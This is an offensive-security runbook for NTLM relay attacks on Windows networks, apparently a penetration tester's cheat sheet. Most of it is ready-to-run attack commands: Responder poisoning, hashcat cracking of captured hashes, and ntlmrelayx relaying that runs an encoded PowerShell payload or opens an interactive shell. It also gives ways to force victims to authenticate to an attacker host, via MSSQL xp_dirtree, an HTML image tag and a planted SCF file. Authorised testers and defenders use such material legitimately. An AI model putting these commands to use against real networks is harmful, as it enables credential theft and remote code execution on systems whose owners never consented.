# NTLM Relay Runbook

---

## Setup: Responder + ntlmrelayx

**Two modes — pick one:**

### Mode A: Capture (crack offline)
```bash
# Responder captures NTLMv2 hashes for offline cracking
python3 Responder.py -I eth0 -wv

# Crack with Hashcat (NTLMv2 = -m 5600)
hashcat -m 5600 captured.txt /usr/share/wordlists/rockyou.txt
```

### Mode B: Relay (don't capture, forward to target)
```bash
# Disable SMB/HTTP in Responder.conf first!
# Edit /etc/responder/Responder.conf → SMB = Off, HTTP = Off
python3 Responder.py -I eth0 -wv

# Relay to target(s) — execute command on relay success
python3 ntlmrelayx.py -tf targets.txt -smb2support
python3 ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc <B64_PAYLOAD>"
python3 ntlmrelayx.py -tf targets.txt -smb2support -i   # interactive SMB shell
```

**targets.txt** — list of IPs where SMB signing is disabled:
```bash
# Find targets without SMB signing (required for relay)
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
```

---

## Force Authentication from Target

**Via MSSQL (if you have SQL access):**
```sql
EXEC xp_dirtree '\\<KALI_IP>\share'
EXEC master..xp_fileexist '\\<KALI_IP>\share\test.txt'
```

**Via SMB trigger (code):**
```cmd
# Compile smb_trigger.cs first
csc.exe /unsafe /out:smb_trigger.exe ..\windows\smb_trigger.cs
# Run on target to force auth to your Kali
.\smb_trigger.exe \\<KALI_IP>\share
```

**Via web server (if there's a web vuln):**
```html
<img src="\\<KALI_IP>\share\x">
```

**Via SCF file (drop in writable share):**
```ini
# Create @pwn.scf and drop in writable network share
[Shell]
Command=2
IconFile=\\<KALI_IP>\share\pwn.ico
[Taskbar]
Command=ToggleDesktop
```

---

## ntlmrelayx Shell Interaction

```bash
# If running with -i flag, connect to interactive shell
nc 127.0.0.1 11000    # default port for relay shell
```

---

## SMB Signing Check

```bash
# Quick check on single host
crackmapexec smb <TARGET> --gen-relay-list out.txt
nmap --script smb2-security-mode -p 445 <TARGET>

# Domain controllers always have signing enabled — don't relay to DC
```

---

## Notes
- **Relay requires**: SMB signing disabled on target (DCs always have it; member servers often don't)
- **NTLM Relay → DA**: If you relay a Domain Admin's hash to a server they're admin on, you get SYSTEM
- **Mitigation awareness**: LMSA restriction, Extended Protection for Auth block relay — check if target is hardened
- **MiTM6**: For IPv6-based relay attacks (if IPv6 enabled on network): `mitm6 -d corp.com`
